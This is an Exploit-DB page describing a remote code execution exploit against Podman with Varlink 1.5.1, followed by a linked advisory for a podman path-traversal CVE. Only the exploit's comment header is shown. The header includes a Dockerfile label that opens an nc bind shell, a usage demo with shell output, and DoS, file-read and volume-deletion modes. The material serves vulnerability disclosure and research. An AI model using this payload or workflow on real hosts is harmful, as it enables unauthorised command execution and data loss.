# Exploit Title: Podman & Varlink 1.5.1 - Remote Code Execution
# Exploit Author: Jeremy Brown
# Date: 2019-10-15
# Vendor Homepage: https://podman.io/
# Software Link: dnf install podman or https://github.com/containers/libpod/releases
# Version: 1.5.1
# Tested on: Fedora Server 30

#!/usr/bin/python
# -*- coding: UTF-8 -*-
#
# pickletime.py
#
# Podman + Varlink Insecure Config Remote Exploit
#
# -------
# Details
# -------
#
# Podman is container engine / platform similar to Docker supported
# by RedHat and Fedora with Varlink being a protocol to exchange
# messages, which comes in handy for things like a Remote API.
#
# Now depending on how Podman and Varlink are deployed, they can be
# susceptible to local and remote attacks. There are a few API bugs
# in Podman itself, as well as a way to execute arbitary commands if
# one can hit Podman via the Remote API. Running Podman with Varlink
# over tcp listening either on localhost or the network interface is the
# most vulnerable setup, but other ways such as access via the local UNIX
# socket or over SSH (key /w no passphrase is common) aren't likely
# to be vulnerable unless ACLs or other stuff is broken.
#
# ------------------
# Testing the issues
# ------------------
#
# - check; just connects and issues GetInfo() to see if the host is
#   running a podman service
#
# - exec; arbitrary cmd execution via ContainerRunlabel() specified
#   by "run" label in the specified hosted image (self-setup)
#
# - dos; crash the server via choosing a /random/ selection from
# 	the available parsing bugs in APIs (we like to have fun here)
#
# - blind; dir traversal in SearchImages() API to force server to
#   read an arbitrary file (no client-side output)
#
# - volrm; loops to remove all volumes via VolumeRemove() behavior
#
# ---------
# Exec demo
# ---------
#
# $ ./pickletime.py check podman-host:6000
# -> Podman service confirmed on host
#
# Then create a Dockerfile with an edgy label, build and host it.
#
# [Dockerfile]
# FROM busybox
# LABEL run=“nc -l -p 10000 -e /bin/bash”
#
# $ ./pickletime.py exec podman-host:6000 docker-registry:5000/image run
# Done!
#
# $ nc podman-host 10000
# ps
#    PID TTY          TIME CMD
# 111640 pts/1    00:00:00 bash
# 111786 pts/1    00:00:00 podman
# 111797 pts/1    00:00:00 nc
# 111799 pts/1    00:00:00 bash
# 111801 pts/1    00:00:00 ps
#
#
# Tested Podman 1.4.4/1.5.1 and Varlink 18 on Fedora Server 30 x64
#
# -----------
# Other stuff
# -----------
#
# Note: admins can really setup their connection and deployment configuration
# however they like, so it's hard to say how many folks are 'doing it wrong'
# or actually are running with proper auth and hardening in place. Shodan
# folks have been contacted about adding support to discover Varlink services
# to get more data that way as well.
#
# Fixed bugs:
# - DoS #2 was fixed in 1.5.1
# - Updated security docs / cli flags TBD
#
# > Why pickles? Why not.
#
# Dependencies to run this code:
#
# sudo dnf install -y python3-podman-api

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Affected versions

< 1.4.0

## Patched versions

1.4.0

## Description

A path traversal vulnerability has been discovered in podman before version 1.4.0 in the way it handles symlinks inside containers. An attacker who has compromised an existing container can cause arbitrary files on the host filesystem to be read/written when an administrator tries to copy a file from/to the container.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

My hunch is that a CNA assigned this CVE based on an entry in exploit-db [1]. I didn't look closely, but this exploit mentions several vulnerabilities which may have already been addressed, such as [CVE-2019-10152](https://github.com/advisories/GHSA-rh5f-2w6r-q7vj "CVE-2019-10152") [2].
